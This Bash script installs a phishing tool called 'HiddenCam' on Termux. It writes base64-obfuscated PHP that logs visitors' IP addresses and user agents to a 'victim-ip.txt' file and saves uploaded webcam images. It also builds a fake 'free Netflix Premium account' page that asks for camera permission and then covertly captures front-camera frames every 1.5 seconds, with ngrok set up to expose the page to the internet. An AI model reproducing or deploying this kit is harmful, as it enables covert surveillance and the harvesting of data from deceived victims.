#!/bin/bash

banner() {

clear
printf "\e[1;33m  _    _ _     _     _             \e[1;32m  _____                 \e[0m\n"
printf "\e[1;33m | |  | (_)   | |   | |            \e[1;32m / ____|                \e[0m\n"
printf "\e[1;33m | |__| |_  __| | __| | ___ _ __   \e[1;32m| |     __ _ _ __ ___   \e[0m\n"
printf "\e[1;33m |  __  | |/ _  |/ _  |/ _ \  _ \  \e[1;32m| |    / _  |  _   _ \  \e[0m\n"
printf "\e[1;33m | |  | | | (_| | (_| |  __/ | | | \e[1;32m| |___| (_| | | | | | | \e[0m\n"
printf "\e[1;33m |_|  |_|_|\__,_|\__,_|\___|_| |_| \e[1;32m \_____\__,_|_| |_| |_| \e[0m\n"
printf " \n"
printf "\e[0m\e[1;93m    Created By HTR-TECH \e[0m\e[1;91m(\e[0m\e[1;92mTahmid Rayat\e[0m\e[1;91m)\e[0m\n"

}
banner
printf " \n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Installing Packages...\e[0m\n"
printf " \n"
pkg install curl php python2 openssh unzip -y

if [[ -e .www ]]; then
echo ""
else
mkdir .www
fi

if [[ -e images ]]; then
echo ""
else
mkdir images
fi

if [[ -e .www/.pagekite ]]; then
echo ""
else
curl -o .www/.pagekite https://pagekite.net/pk/pagekite.py > /dev/null 2>&1
fi

# Create Files

if [[ -e .www/index.php ]]; then
echo ""
else
printf "<?php\ninclude '.camdata.php';\nheader('Location: NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/index.php
fi

if [[ -e .www/.camdata.php ]]; then
echo ""
else
printf "<?php\n  " > .www/.log1.php
printf "$" >> .www/.log1.php
printf "str = 'PD9waHAKCmlmICghZW1wdHkoJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10pKQogICAgewogICAgICAkaXBhZGRyZXNzID0gJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10uIlxyXG4iOwogICAgfQplbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXSkpCiAgICB7CiAgICAgICRpcGFkZHJlc3MgPSAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXS4iXHJcbiI7CiAgICB9CmVsc2UKICAgIHsKICAgICAgJGlwYWRkcmVzcyA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddLiJcclxuIjsKICAgIH0KJHVzZXJhZ2VudCA9ICIgVXNlci1BZ2VudDogIjsKJGJyb3dzZXIgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107CiRzcGFjZSA9ICJcclxuIjsKCgokZmlsZSA9ICcuLi92aWN0aW0taXAudHh0JzsKJHZpY3RpbSA9ICJJUDogIjsKJGZwID0gZm9wZW4oJGZpbGUsICdhJyk7Cgpmd3JpdGUoJGZwLCAkdmljdGltKTsKZndyaXRlKCRmcCwgJGlwYWRkcmVzcyk7CmZ3cml0ZSgkZnAsICR1c2VyYWdlbnQpOwpmd3JpdGUoJGZwLCAkYnJvd3Nlcik7CmZ3cml0ZSgkZnAsICRzcGFjZSk7CgpmY2xvc2UoJGZwKTs=';\n  echo base64_decode(" >> .www/.log1.php
printf "$" >> .www/.log1.php
printf "str);\n?>" >> .www/.log1.php
php .www/.log1.php > .www/.camdata.php
rm -rf .www/.log1.php
fi

if [[ -e .www/.htrtech.php ]]; then
echo ""
else
printf "<?php\n  " > .www/.log2.php
printf "$" >> .www/.log2.php
printf "str = 'PD9waHAKCiRkYXRlID0gZGF0ZSgnaV9zX0gtZE1ZJyk7CiRpbWFnZURhdGE9JF9QT1NUWydjYXQnXTsKCmlmICghZW1wdHkoJF9QT1NUWydjYXQnXSkpIHsKZXJyb3JfbG9nKCJSZWNlaXZlZCIgLiAiXHJcbiIsIDMsICIuY2FtLmxvZyIpOwoKfQoKJGZpbHRlcmVkRGF0YT1zdWJzdHIoJGltYWdlRGF0YSwgc3RycG9zKCRpbWFnZURhdGEsICIsIikrMSk7CiR1bmVuY29kZWREYXRhPWJhc2U2NF9kZWNvZGUoJGZpbHRlcmVkRGF0YSk7CiRmcCA9IGZvcGVuKCAnLi4vaW1hZ2VzL0hpZGRlbkNhbS0nLiRkYXRlLicucG5nJywgJ3diJyApOwpmd3JpdGUoICRmcCwgJHVuZW5jb2RlZERhdGEpOwpmY2xvc2UoICRmcCApOwoKZXhpdCgpOwo/Pg==';\n  echo base64_decode(" >> .www/.log2.php
printf "$" >> .www/.log2.php
printf "str);\n?>" >> .www/.log2.php
php .www/.log2.php > .www/.htrtech.php
rm -rf .www/.log2.php
fi

if [[ -e .www/NetFlix-Premium-Account.html ]]; then
echo ""
else
printf """<script>
     alert("Click Allow On The Popup.Otherwise You Can't Get The Account.")
</script>
<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script>

function post(imgdata){\n""" > .www/NetFlix-Premium-Account.html
printf "$" >> .www/NetFlix-Premium-Account.html
printf """.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: '.htrtech.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:""" >> .www/NetFlix-Premium-Account.html
printf "$" >> .www/NetFlix-Premium-Account.html
printf """{e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}

// Load init
init();

</script>

<h2 style="text-align: center;">
<span style="color: red; font-size: x-large;">Get Premium Netflix Accounts Every Hour</span></h2>
<div>
</div>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://1.bp.blogspot.com/-URf15bedYtI/XkTxSVjSHDI/AAAAAAAABHI/xGK9mhMxRG4_2NHwByj2p5c79sVtQ82igCLcBGAsYHQ/s1600/download.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="154" data-original-width="326" height="302" src="https://1.bp.blogspot.com/-URf15bedYtI/XkTxSVjSHDI/AAAAAAAABHI/xGK9mhMxRG4_2NHwByj2p5c79sVtQ82igCLcBGAsYHQ/s640/download.png" width="640" /></a></div>
<h2 style="text-align: center;">
<span style="background-color: white; font-family: &quot;helvetica neue&quot; , &quot;helvetica&quot; , &quot;arial&quot; , sans-serif; font-size: large;"><span style="color: red;">Please Read The Full Article</span></span></h2>
<h2 style="text-align: center;">
<span style="background-color: white; color: #333333; font-family: &quot;helvetica neue&quot; , &quot;helvetica&quot; , &quot;arial&quot; , sans-serif; font-size: large;">Netflix Premium Account Features</span></h2>
<div>
<div style="background-color: white; box-sizing: inherit; color: #222222; font-family: &quot;helvetica neue&quot;, Helvetica, Arial, sans-serif; font-size: 15px; margin-bottom: 26px; padding: 0px;">
You can watch the movies on your smartphone, tablet or computer. In case you want to watch them on TV, recent smart TVs already have the app. If you have an old TV or want to watch Netflix in your hotel room, just use a small streaming media player like Apple TV, Roku streaming stick or Google Chromecast.</div>
<div style="background-color: white; box-sizing: inherit; color: #222222; font-family: &quot;helvetica neue&quot;, Helvetica, Arial, sans-serif; font-size: 15px; margin-bottom: 26px; padding: 0px;">
At the moment,&nbsp;<span style="box-sizing: inherit; font-weight: 700;">Netflix</span>&nbsp;is offering 3 different plans, including&nbsp;<em style="box-sizing: inherit;">Basic</em>,&nbsp;<em style="box-sizing: inherit;">Standard</em>, and&nbsp;<em style="box-sizing: inherit;">Premium</em>&nbsp;which cost 9, 13 and 16 usd respectively. I’m using the Premium account at the moment because it is offering HD, 4K Ultra HD, and even 4K HDR (High Dynamic Range) content with HDR10, Dolby Vision, and Dolby Atmos. To watch the 4K content, you will need a high-speed Internet connection of 25 Mbps or faster, and of course, a capable 4K TV. Another reason I choose the Premium plan is that it allows 4 devices to watch videos simultaneously, so I can easily share my account with others.<br />
<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://www.techwalls.com/wp-content/uploads/2019/10/netflix-free-1024x515.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="402" data-original-width="800" src="https://www.techwalls.com/wp-content/uploads/2019/10/netflix-free-1024x515.jpg" /></a></div>
</div>
<h2 style="background-color: white; box-sizing: inherit; font-family: &quot;helvetica neue&quot;, Helvetica, Arial, sans-serif; margin-bottom: 26px; padding: 0px; text-align: center;">
<button span="" style="color: blue;"><span style="font-size: x-large;">Please Wait 3 Minutes</span></a></button></h2>
</div>
<h3>
<b> <span style="color: red;">Note&nbsp;</span></b><b><span style="color: red;">:</span></b></h3>
<h3>
<span style="color: red;"><b>* We just need your Ip Address.So,Click Allow on The Popup.And wait 1 minute .</b></span></h3>
<h3>
<span style="color: red;"><b>* The Process is Automated . So just have Patient.</b></span></h3>
<h3>
<span style="color: red;"><b>* If you don't press Allow , then you will not get Any Account.</b></span></h3>
<div>
<span style="color: red;"><b><br /></b></span></div>
<div style="text-align: right;">
<span style="color: red;"><b>Copyright by HTR-TECH</b></span></div>""" >> .www/NetFlix-Premium-Account.html
printf " " >> .www/NetFlix-Premium-Account.html
fi

echo 'termux-open-url https://github.com/htr-tech/' > /data/data/com.termux/files/usr/bin/htr-tech
echo 'termux-open-url https://github.com/htr-tech/' > /data/data/com.termux/files/usr/bin/HTR-TECH
echo 'termux-open-url https://www.instagram.com/tahmid.rayat/' > /data/data/com.termux/files/usr/bin/instagram
echo 'termux-open-url https://www.instagram.com/tahmid.rayat/' > /data/data/com.termux/files/usr/bin/Instagram
chmod +x /data/data/com.termux/files/usr/bin/htr-tech
chmod +x /data/data/com.termux/files/usr/bin/HTR-TECH
chmod +x /data/data/com.termux/files/usr/bin/instagram
chmod +x /data/data/com.termux/files/usr/bin/Instagram


banner
printf " \n"
printf " \n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Initializing...\e[0m\n"

if [[ -e .www/ngrok ]]; then
echo ""
else
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -o ngrok-stable-linux-arm.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip -d .www > /dev/null 2>&1
chmod +x .www/ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi

else
curl -o ngrok-stable-linux-386.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip -d .www > /dev/null 2>&1
chmod +x .www/ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
fi
fi

printf " \n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Installation Completed ...\e[0m\n"
printf " \n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;96m Type \e[1;93mbash hiddencam \e[1;96mto run this tool\e[0m\n"
sleep 2
printf "\e[0m\n"
printf "\e[0m\n"
